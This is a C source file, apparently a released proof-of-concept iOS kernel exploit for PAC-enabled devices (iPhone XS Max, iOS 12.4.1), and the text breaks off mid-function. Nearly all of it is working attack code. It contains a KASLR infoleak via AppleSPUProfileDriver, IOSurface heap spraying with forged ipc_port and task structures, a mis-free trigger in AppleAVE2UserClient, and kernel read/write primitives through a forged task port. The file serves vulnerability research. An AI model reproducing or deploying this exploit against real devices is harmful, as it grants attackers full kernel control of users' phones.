#if __arm64e__
//
//  pac_kernel.c
//  [ ZecOps.com Task-For-Pwn 0 - TFP0 Submission on PAC Devices ]
//  [ Agentless, Automated, DFIR Investigations                  ]
//  [ Find Attackers' Mistakes                                   ]
//  [ For additional Task-For-Pwn-0 submissions visit https://blog.zecops.com/vulnerabilities/what-does-checkm8-mean-for-ios-dfir-and-freethesandbox/                                                  ]
//  Created by bb on 11/13/19.
//  Copyright © 2019 bb. All rights reserved.
//  Use on your own devices, at your own risk. Released for research purposes only. We will take no responsibility for this POC.

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/semaphore.h>
#include <mach/mach_traps.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include "IOKitLib.h"
#include <dirent.h>
#include <mach-o/dyld.h>
#include <common.h>

// ---------- Hardcoded Kernel offsets
//iPhone XS Max 12.4.1

uint64_t HARDCODED_kernel_base = 0xfffffff007004000;
uint64_t HARDCODED_infoleak_addr = 0xfffffff009169000;
uint64_t HARDCODED_kernel_map = 0xfffffff0091697a0; // via jtool2
uint64_t HARDCODED_ipc_space_kernel = 0xFFFFFFF009145240; // locate task_suspend symbol via jtool2, then look it up on IDA
uint64_t Predict_kalloc_ADDRESS = 0xffffffe011500000; // For spray purpose
uint64_t HARDCODED_allproc = 0xfffffff00918bde8;
uint32_t HARDCODED_proc_p_id = 0x60;
// ----------

#pragma mark - Kernel Exploitation - Expose Previous Definitions

extern void Reply_notify_completion(void);
extern void Map_file_intoMem(void);
extern mach_vm_address_t mapEnd;
extern int cow_fd;
extern uint32_t cowmemlen;
extern char *Get_tempfile1_path(void);
extern void Reply_notify_completion(void);
extern void Send_overwritting_iosurfaceMap(uint64_t our_data_addr, uint64_t our_data_len, uint64_t remote_map_addr);
extern void Send_exit_msg(void);

extern mach_port_t midi_bsport;

extern uint64_t PACSupport_addMask(uint64_t data_ptr, uint32_t mask);
extern uint64_t PACSupport_pacdza(uint64_t data_ptr);
extern uint64_t PACSupport_paciza(uint64_t code_ptr);
extern uint64_t PACSupport_pacia(uint64_t code_ptr, uint64_t modifier);

#define OF(offset) (offset)/sizeof(uint64_t)

#define IO_BITS_PORT_INFO   0x0000f000
#define IO_BITS_KOTYPE      0x00000fff
#define IO_BITS_OTYPE       0x7fff0000
#define IO_BITS_ACTIVE      0x80000000

#define IKOT_NONE               0
#define IKOT_THREAD             1
#define IKOT_TASK               2
#define IKOT_HOST               3
#define IKOT_HOST_PRIV          4
#define IKOT_PROCESSOR          5
#define IKOT_PSET               6
#define IKOT_PSET_NAME          7
#define IKOT_TIMER              8
#define IKOT_PAGING_REQUEST     9
#define IKOT_MIG                10
#define IKOT_MEMORY_OBJECT      11
#define IKOT_XMM_PAGER          12
#define IKOT_XMM_KERNEL         13
#define IKOT_XMM_REPLY          14
#define IKOT_UND_REPLY          15
#define IKOT_HOST_NOTIFY        16
#define IKOT_HOST_SECURITY      17
#define IKOT_LEDGER             18
#define IKOT_MASTER_DEVICE      19
#define IKOT_TASK_NAME          20
#define IKOT_SUBSYSTEM          21
#define IKOT_IO_DONE_QUEUE      22
#define IKOT_SEMAPHORE          23
#define IKOT_LOCK_SET           24
#define IKOT_CLOCK              25
#define IKOT_CLOCK_CTRL         26
#define IKOT_IOKIT_SPARE        27
#define IKOT_NAMED_ENTRY        28
#define IKOT_IOKIT_CONNECT      29
#define IKOT_IOKIT_OBJECT       30
#define IKOT_UPL                31
#define IKOT_MEM_OBJ_CONTROL    32
#define IKOT_AU_SESSIONPORT     33
#define IKOT_FILEPORT           34
#define IKOT_LABELH             35
#define IKOT_TASK_RESUME        36

volatile struct ipc_port {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

volatile struct task
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
};

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};


/*
 In order to construct a functional TFP0:
 
 kernel_space_addr needs be in the fakeport stru
 kernel_map_addr needs be in the faketask stru
 
 */
uint64_t kernel_map_addr = 0;
uint64_t kernel_space_addr = 0;
mach_port_t tfp0_port = 0;

uint64_t kaslr = 0;

uint64_t leaked_ourTaskPort_addr = 0;
uint64_t leaked_MIDIServerPort_addr = 0;

#define SPRAY_ADDRESS 0x29f000000
void *cowmem = NULL;

void IOConnectMapMemory_test_kaslr(io_connect_t ioconn){
    
    mach_vm_address_t map_addr = 0;
    mach_vm_size_t map_size = 0;
    
    kern_return_t kr;
    kr = IOConnectMapMemory64(ioconn, 0, mach_task_self(), &map_addr, &map_size, kIOMapAnywhere);
    if(kr){
        LOG("Error: IOConnectMapMemory64(0x%x))\n", kr);
    }
    
    uint32_t search = 0xfffffff0; // Constant value of Kernel code segment higher 32bit addr
    uint64_t _tmpv = map_addr;
    size_t remainsize = map_size;
    while((_tmpv = (uint64_t)memmem((const void*)_tmpv, remainsize, &search, 4))){
        
#pragma mark HOW_TO_DEFEAT_KASLR
        /*
         How to ontain infoleak address by testing:
         
         If you don't have saved infoleak address, you need to uncomment this line:
         kaslr = 0x100;
         
         Therefore, you can cause a kernel panic, extract kernel panic file to read what kASLR offset was, and then do calculation  with previous output log "Leaked address: "
         
         Leaked address - Known slide = infoleak_addr
         The result of calc is the static value of the hardcoded value:
         
         infoleak_addr = ??????????; // 2
         
         */
        
        LOG("Leaked address: 0x%llx\n", *(uint64_t*)(_tmpv - 4));
        // This is the leaked kernel address, included KASLR
        
        //kaslr = 0x100; // <-- Uncomment it if you want to cause kernel panic
        
        // So be sure infoleak_addr is 100% correct, otw program will stuck here
        uint64_t tmpcalc = *(uint64_t*)(_tmpv - 4) - HARDCODED_infoleak_addr;
        //LOG("tmpcalc: 0x%llx\n", tmpcalc);
        if( !(tmpcalc & 0xFFF) ){
            // kaslr offset always be 0x1000 aligned
            kaslr = tmpcalc;
            break;
        }
        
        _tmpv += 4;
        remainsize = ((uint64_t)map_addr + remainsize - _tmpv);
    }
    IOConnectUnmapMemory(ioconn, 0, mach_task_self(), map_addr);
}

mach_vm_offset_t Get_kaslr(io_connect_t ioconn){
    // Info Leak located in AppleSPUProfileDriverUserClient
    // open service in AppleSPUProfileDriver
    
    uint64_t input1 = 1;
    LOG("getting kaslr\n");
    
    // Trying to allocating a new SharedDataQueue memory
    while(IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL)){
        input1 = 0;
        IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL); //Remove existing SharedDataQueue memory
        input1 = 1;
    }
    
    IOConnectMapMemory_test_kaslr(ioconn);
    LOG("getting kaslr2\n");
    int i =0;
    while(!kaslr){
        IOConnectCallStructMethod(ioconn, 11, NULL, 0, NULL, NULL);
        IOConnectMapMemory_test_kaslr(ioconn);
        if(i == 5){
            i = 0;
            input1 = 0;
            IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL);
            input1 = 1;
            IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL);
        }
        i++;
    }
    LOG("getting kaslr3\n");
    input1 = 0;
    IOConnectCallScalarMethod(ioconn, 0, &input1, 1, NULL, NULL); //shutdown
    
    return kaslr;
}

bool check_num_stringlizability_4bytes(uint32_t input_num){
    char *stringlize = (char*)&input_num;
    if(stringlize[0] == '\0')
        return false;
    if(stringlize[1] == '\0')
        return false;
    return true;
}

void IOSurfaceRootUserClient_sRemoveValue(io_connect_t surfaceroot_ioconn, uint32_t spray_id, uint32_t key){
    // if key == 0, indicate delete the entire dictionary
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = key;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    IOConnectCallStructMethod(surfaceroot_ioconn, 11, input_stru, sizeof(input_stru), &output_stru, &output_stru_size);
}

uint32_t hit_key = 0;
void IOSurfaceRootUserClient_sCopyValue(io_connect_t surfaceroot_ioconn, uint32_t spray_id, uint32_t lookup_key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = lookup_key;
    
    size_t output_stru_size = 0x5000;
    char *output_stru = calloc(1, 0x5000);
    
    int kr = IOConnectCallStructMethod(surfaceroot_ioconn, 10, input_stru, sizeof(input_stru), output_stru, &output_stru_size);
    if(kr){
        LOG("lookup_key: 0x%x IOSurfaceRootUserClient_sCopyValue failure: 0x%x\n", lookup_key, kr);
        free(output_stru);
        return;
    }
    
    if(*(uint64_t*)(output_stru + 0x10) != 0x6666666666666666){
        hit_key = lookup_key;
        
        leaked_ourTaskPort_addr = *(uint64_t*)(output_stru + 0x50);
        leaked_MIDIServerPort_addr = *(uint64_t*)(output_stru + 0x58);
    }
    
    free(output_stru);
}

void build_fake_ipc_port_stru(struct ipc_port *fakeport, uint64_t specify_kobject){
    bzero(fakeport, sizeof(struct ipc_port)); // Size: 0xA8
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = specify_kobject;
    
    fakeport->ip_receiver = kernel_space_addr;
}

void build_fake_task_stru_forReadMem(char *faketask, uint64_t target_addr){
    
    *(uint32_t*)(faketask + 0x10) = 99; // ref_cnt
    
    // offset 0x368: mach task->bsd_info
    *(uint64_t*)(faketask + 0x368) = target_addr - 0x60;
}

void build_fake_task_stru_forTFP0(struct task *faketask){
    
    faketask->ref_count = 99;
    faketask->lock.data = 0x0;
    faketask->lock.type = 0x22;
    faketask->active = 1;
    faketask->map = kernel_map_addr;
    
    *(uint64_t*)((char*)faketask + 0x3A8) = kaslr + HARDCODED_kernel_base;
    *(uint64_t*)((char*)faketask + 0x3B0) = kaslr;
}

void Arrange_cowmem(){
    close(cow_fd);
    
    vm_address_t addr = SPRAY_ADDRESS;
    munmap((void*)addr, cowmemlen);
    vm_allocate(mach_task_self(), &addr, 0x4000, VM_FLAGS_FIXED);
    addr = SPRAY_ADDRESS + 0x4000;
    munmap((void*)addr, cowmemlen);
    vm_allocate(mach_task_self(), &addr, 0x4000, VM_FLAGS_FIXED);
    addr = SPRAY_ADDRESS + 0x8000;
    munmap((void*)addr, cowmemlen);
    vm_allocate(mach_task_self(), &addr, 0x4000, VM_FLAGS_FIXED);
}

void Send_spray_mem_toKernel1(io_connect_t surfaceroot_ioconn, uint32_t spray_id){
    
    uint64_t first_spray_addr = SPRAY_ADDRESS;
    uint32_t spray_data_len = 0x4000;
    uint64_t last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    uint32_t cnt = 0xC000;
    //LOG("spray_data_len: 0x%x total: 0x%x\n", spray_data_len, spray_data_len * cnt);
    
    bzero((void*)SPRAY_ADDRESS, 3*0x4000);
    uint64_t *spraydata = (uint64_t*)(SPRAY_ADDRESS + 0x4000);
    
    // For tagging purpose, if memory content gets replaced, these 0x66 will be gone
    memset(spraydata, 0x66, 0x4000);
    
    // Empty member values as to avoid any function calling, thus to bypass PAC
    spraydata[OF(0x58)] = 0;
    spraydata[OF(0x28)] = 0;
    spraydata[OF(0x30)] = 0;
    spraydata[OF(0x20)] = 0;
    
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x100), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x600);
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x200), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0xA00);
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x300), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0xE00);
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x400), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x1200);
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x500), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x1600);
    
    build_fake_task_stru_forReadMem((char*)spraydata + 0x600, kaslr + HARDCODED_kernel_map);
    build_fake_task_stru_forReadMem((char*)spraydata + 0xA00, kaslr + HARDCODED_kernel_map + 4);
    build_fake_task_stru_forReadMem((char*)spraydata + 0xE00, kaslr + HARDCODED_ipc_space_kernel);
    build_fake_task_stru_forReadMem((char*)spraydata + 0x1200, kaslr + HARDCODED_ipc_space_kernel + 4);
    build_fake_task_stru_forTFP0((struct task *)((char*)spraydata + 0x1600));
    
    // update spray_data_len
    // OSData use kmem_alloc while request size is equal or greater than page_size, a more primitive memory alloc system, and they won't be at kalloc zones, because of that, shrink spray_data_len to 0x3FFF
    spray_data_len = 0x3FFF;
    last_spray_addr = first_spray_addr + 0x4000 + cowmemlen;
    //last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    
    uint32_t *seria_data = (void*)(first_spray_addr + cowmemlen - 20);
    seria_data[0] = spray_id;
    seria_data[1] = 0;
    seria_data[2] = kOSSerializeMagic;
    seria_data[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    seria_data[4] = kOSSerializeData | spray_data_len;
    
    uint32_t *seria_data_end = (void*)last_spray_addr;
    seria_data_end[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    seria_data_end[1] = 0x1;
    
    uint64_t seria_data_len = spray_data_len + 20 + 8;
    seria_data_len += 1;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=1; i<cnt; i++){
        seria_data_end[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(surfaceroot_ioconn, 9, seria_data, seria_data_len, &output_stru, &output_stru_size);
    }
}

void Send_spray_mem_toKernel2(io_connect_t surfaceroot_ioconn, uint32_t spray_id){
    
    uint64_t first_spray_addr = SPRAY_ADDRESS;
    uint32_t spray_data_len = 0x4000;
    uint64_t last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    
    bzero((void*)SPRAY_ADDRESS, 3*0x4000);
    uint64_t *spraydata = (uint64_t*)(SPRAY_ADDRESS + 0x4000);
    
    spraydata[0] = kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x100; // first fake ipc object, insert fakeport here pointing to a faketask stru
    spraydata[1] = kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x200;
    spraydata[2] = kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x300;
    spraydata[3] = kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x400;
    spraydata[4] = kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x500;
    
    // update spray_data_len
    spray_data_len = 0x3FFF;
    last_spray_addr = first_spray_addr + 0x4000 + cowmemlen;
    //last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    
    uint32_t *seria_data = (void*)(first_spray_addr + cowmemlen - 20);
    seria_data[0] = spray_id;
    seria_data[1] = 0;
    seria_data[2] = kOSSerializeMagic;
    seria_data[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    seria_data[4] = kOSSerializeData | spray_data_len;
    
    uint32_t *seria_data_end = (void*)last_spray_addr;
    seria_data_end[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    seria_data_end[1] = 0x1;
    
    uint64_t seria_data_len = spray_data_len + 20 + 8;
    seria_data_len += 1;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    for(int i=0xD000;i<0xD200;i++){
        seria_data_end[1] = i;
        if(!check_num_stringlizability_4bytes(i))
            continue;
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(surfaceroot_ioconn, 9, seria_data, seria_data_len, &output_stru, &output_stru_size);
    }
}

void Send_spray_mem_toKernel3(io_connect_t surfaceroot_ioconn, uint32_t spray_id){
    
    uint64_t first_spray_addr = SPRAY_ADDRESS;
    uint32_t spray_data_len = 0x4000;
    uint64_t last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    uint32_t cnt = 0xC000;
    //LOG("spray_data_len: 0x%x total: 0x%x\n", spray_data_len, spray_data_len * cnt);
    
    bzero((void*)SPRAY_ADDRESS, 3*0x4000);
    uint64_t *spraydata = (uint64_t*)(SPRAY_ADDRESS + 0x4000);
    
    build_fake_ipc_port_stru((struct ipc_port *)((char*)spraydata + 0x500), kaslr + Predict_kalloc_ADDRESS - spray_data_len + 0x1600);
    build_fake_task_stru_forTFP0((struct task *)((char*)spraydata + 0x1600));
    
    // update spray_data_len
    spray_data_len = 0x3FFF;
    last_spray_addr = first_spray_addr + 0x4000 + cowmemlen;
    //last_spray_addr = first_spray_addr + spray_data_len + cowmemlen;
    
    uint32_t *seria_data = (void*)(first_spray_addr + cowmemlen - 20);
    seria_data[0] = spray_id;
    seria_data[1] = 0;
    seria_data[2] = kOSSerializeMagic;
    seria_data[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    seria_data[4] = kOSSerializeData | spray_data_len;
    
    uint32_t *seria_data_end = (void*)last_spray_addr;
    seria_data_end[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    seria_data_end[1] = 0x1;
    
    uint64_t seria_data_len = spray_data_len + 20 + 8;
    seria_data_len += 1;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=1; i<cnt; i++){
        seria_data_end[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(surfaceroot_ioconn, 9, seria_data, seria_data_len, &output_stru, &output_stru_size);
    }
}

uint32_t IOSurfaceRootUserClient_create_surface(io_connect_t ioconn, uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x30000, //Need be least greater than 0x25b00 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad (48 - 154368)
        0x0,
    };
    
    size_t output_stru_size = 0xDD0; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        //uint64_t ret_addr2 = *(uint64_t*)(output_stru + 8); // Read-only mapping from kernel
        //uint64_t ret_addr3 = *(uint64_t*)(output_stru + 0x10); // Read-only mapping from kernel
        // These are unused values here, you can deleted them.
        
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

mach_port_t local_sendrecv_port = 0;
void send_to_self_init(){
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &local_sendrecv_port);
    LOG("local_sendrecv_port: 0x%x\n", local_sendrecv_port);
    mach_port_insert_right(mach_task_self(), local_sendrecv_port, local_sendrecv_port, MACH_MSG_TYPE_MAKE_SEND);
}

void send_to_self_aaa(){
    struct send_Msg{
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t ool_ports;
        mach_msg_ool_ports_descriptor_t ool_ports2;
        mach_msg_ool_ports_descriptor_t ool_ports3;
    }msg = {0};
    
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.base.header.msgh_size = sizeof(msg);
    msg.base.header.msgh_remote_port = local_sendrecv_port;
    msg.base.header.msgh_id = 0x111;
    msg.base.body.msgh_descriptor_count = 3;
    
    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.ool_ports.deallocate = false;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.ool_ports.copy = MACH_MSG_VIRTUAL_COPY;
    
    uint32_t *oolports = calloc(1, 0x2000);
    oolports[8] = mach_task_self(); // Can use to leak our task stru address
    LOG("midi_bsport: 0x%x\n", midi_bsport);
    oolports[9] = midi_bsport;
    
    msg.ool_ports.address = oolports;
    msg.ool_ports.count = 0x7FE;
    /*
     kernel buf size = msg.ool_ports.count x 0x8, which in this case:
     0x7FE x 0x8 = 0x3FF0
     
     Reason for no use 0x800, is due to our spray method
     OSData use kmem_alloc while request size is equal or greater than page_size, a more primitive memory alloc system, and they won't be at kalloc zones, because of that, we use 0x3FFF as spray size, causes the last byte at end of the page unpredictable, if use 0x800, anything besides 0 may misinterpreted as a kernel pointer, leads to exploit failure.
     Avoid run into that risk, do not use 0x800.
     */
    
    memcpy(&msg.ool_ports2, &msg.ool_ports, sizeof(msg.ool_ports));
    memcpy(&msg.ool_ports3, &msg.ool_ports, sizeof(msg.ool_ports));
    
    mach_msg_send((mach_msg_header_t *)&msg);
}

uint64_t KernelRead_from_pid_for_task(uint32_t port1, uint32_t port2){
    int kr = 0;
    int low32bits = 0;
    int high32bits = 0;
    if((kr = pid_for_task(port1, &low32bits))){
        LOG("KernelRead_from_pid_for_task 1 err: 0x%x\n", kr);
    }
    if((kr = pid_for_task(port2, &high32bits))){
        LOG("KernelRead_from_pid_for_task 2 err: 0x%x\n", kr);
    }
    return (((uint64_t)high32bits) << 32) | (uint32_t)low32bits;
}

void trying_to_catch_crafted_port(mach_msg_ool_ports_descriptor_t *ool_port){
    
    uint32_t *recvports = ool_port->address;
    //LOG("got ports: 0x%x 0x%x 0x%x 0x%x 0x%x\n", recvports[0], recvports[1], recvports[2], recvports[3], recvports[4]);
    if(recvports[0]){
        
        kernel_map_addr = KernelRead_from_pid_for_task(recvports[0], recvports[1]);
        LOG("kernel map: 0x%llx\n", kernel_map_addr);
        kernel_space_addr = KernelRead_from_pid_for_task(recvports[2], recvports[3]);
        LOG("kernel space: 0x%llx\n", kernel_space_addr);
        
        tfp0_port = recvports[4];
        mach_port_destroy(mach_task_self(), recvports[0]);
        mach_port_destroy(mach_task_self(), recvports[1]);
        mach_port_destroy(mach_task_self(), recvports[2]);
        mach_port_destroy(mach_task_self(), recvports[3]);
    }
}

void send_to_self_bbb(){
    struct send_Msg{
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t ool_ports;
        mach_msg_ool_ports_descriptor_t ool_ports2;
        mach_msg_ool_ports_descriptor_t ool_ports3;
        mach_msg_trailer_t trailer;
    }msg = {0};
    
    msg.base.header.msgh_size = sizeof(msg);
    msg.base.header.msgh_local_port = local_sendrecv_port;
    
    int mrr = mach_msg_receive((mach_msg_header_t *)&msg);
    if(mrr){
        LOG("bbb mach_msg returns err: 0x%x\n", mrr);
        return;
    }
    
    trying_to_catch_crafted_port(&msg.ool_ports);
    trying_to_catch_crafted_port(&msg.ool_ports2);
    trying_to_catch_crafted_port(&msg.ool_ports3);
}

uint32_t KernelRead_4bytes(uint64_t rAddr){
    uint32_t retdata = 0;
    vm_size_t outsize = 0x4;
    vm_read_overwrite(tfp0_port, rAddr, 0x4, (vm_address_t)&retdata, &outsize);
    return retdata;
}

uint64_t KernelRead_8bytes(uint64_t rAddr){
    uint64_t retdata = 0;
    vm_size_t outsize = 0x8;
    vm_read_overwrite(tfp0_port, rAddr, 0x8, (vm_address_t)&retdata, &outsize);
    return retdata;
}

void KernelRead_anySize(uint64_t rAddr, char *outbuf, size_t outbuf_len){
    vm_size_t outsize = outbuf_len;
    vm_read_overwrite(tfp0_port, rAddr, outbuf_len, (vm_address_t)outbuf, &outsize);
}

void KernelWrite_2bytes(uint64_t wAddr, uint16_t wData){
    vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x2);
}

void KernelWrite_4bytes(uint64_t wAddr, uint32_t wData){
    vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x4);
}

void KernelWrite_8bytes(uint64_t wAddr, uint64_t wData){
    vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x8);
}

void KernelWrite_anySize(uint64_t wAddr, char *inputbuf, uint32_t inputbuf_len){
    vm_write(tfp0_port, wAddr, (vm_offset_t)inputbuf, inputbuf_len);
}

uint64_t KernelAllocate(size_t len){
    vm_address_t return_addr = 0;
    vm_allocate(tfp0_port, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    return return_addr;
}


void AppleAVE2UserClient_sPrepareToEncodeFrame(io_connect_t ioconn, io_connect_t surface_ioconn){
    
    send_to_self_init();
    
    {
        size_t input_stru_size = 0x8;
        char *input_stru = calloc(1, input_stru_size);
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(ioconn, 0, input_stru, input_stru_size, output_stru, &output_stru_size);
        // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    }
    
    uint64_t surface1_map_addr = 0, surface1_map_size = 0;
    uint32_t iosurface_1 = IOSurfaceRootUserClient_create_surface(surface_ioconn, &surface1_map_addr, (uint32_t*)&surface1_map_size);
    
    Arrange_cowmem();
    
    // Spray memory contain fakeport and faketask
    Send_spray_mem_toKernel1(surface_ioconn, iosurface_1);
    
    char *clientbuf = malloc(surface1_map_size);
    bzero(clientbuf, surface1_map_size);
    
    *(uint64_t*)(clientbuf + 0x0) = Predict_kalloc_ADDRESS + kaslr; // Target kalloc heap will be mis-freed
    *(uint32_t*)(clientbuf + 0x7F4) = 0x6; // clientbuf->MEMORY_INFO_array_size1
    *(uint64_t*)(clientbuf + 0x3420) = 0x6; // clientbuf->MEMORY_INFO_array_size2
    // 5 is the limit here, 6 gives an extra round which become over-boundary reading
    
    Send_overwritting_iosurfaceMap((uint64_t)clientbuf, surface1_map_size, surface1_map_addr);
    Reply_notify_completion();
    free(clientbuf);
    
    char *input_stru = calloc(1, 264); //0x108
    *(uint32_t*)(input_stru + 4) = iosurface_1; //FrameQueueSurfaceId
    *(uint32_t*)(input_stru + 8) = iosurface_1; //InitInfoSurfaceId, vulnerable iosurface user
    
    *(uint32_t*)(input_stru + 12) = iosurface_1; //ParameterSetsBuffer
    
    *(uint32_t*)(input_stru + 208) = iosurface_1; // codedHeaderCSID & codedHeaderBuffer [0]
    *(uint32_t*)(input_stru + 212) = iosurface_1; // codedHeaderCSID & codedHeaderBuffer [1]
    
    size_t output_stru_size = 0x4;
    char *output_stru = calloc(1, output_stru_size);
    
    // Load crafted clientbuf into chamber
    IOConnectCallStructMethod(ioconn, 7, input_stru, 0x108, output_stru, &output_stru_size);
    
    LOG("Triggering vulnerability...\n");
    {
        // Release the clientbuf to trigger vulnerability
        size_t input_stru_size = 0x4;
        char *input_stru = calloc(1, input_stru_size);
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(ioconn, 1, input_stru, input_stru_size, output_stru, &output_stru_size);
    }
    
    send_to_self_aaa();
    
    // check spray memory
    LOG("check spray memory...\n");
    for(int i=1;i<0xC000;i++){
        if(!check_num_stringlizability_4bytes(i))
            continue;
        
        IOSurfaceRootUserClient_sCopyValue(surface_ioconn, iosurface_1, i);
    }
    IOSurfaceRootUserClient_sRemoveValue(surface_ioconn, iosurface_1, hit_key);
    
    // spray again
    Send_spray_mem_toKernel2(surface_ioconn, iosurface_1);
    
    send_to_self_bbb();
    
    // release spray mem to have more avai memory
    for(int i=1;i<0xC000;i++){
        if(!check_num_stringlizability_4bytes(i))
            continue;
        IOSurfaceRootUserClient_sRemoveValue(surface_ioconn, iosurface_1, i);
    }
    
    Send_spray_mem_toKernel3(surface_ioconn, iosurface_1);
    
    // Now we supposedly got temporary TFP0 port
    
    Send_exit_msg(); // Quit MIDIServer
    mach_port_destroy(mach_task_self(), midi_bsport);
    
    LOG("Testing tfp0...\n");
    {
        uint32_t testread = 0;
        vm_size_t outsize = 0x4;
        
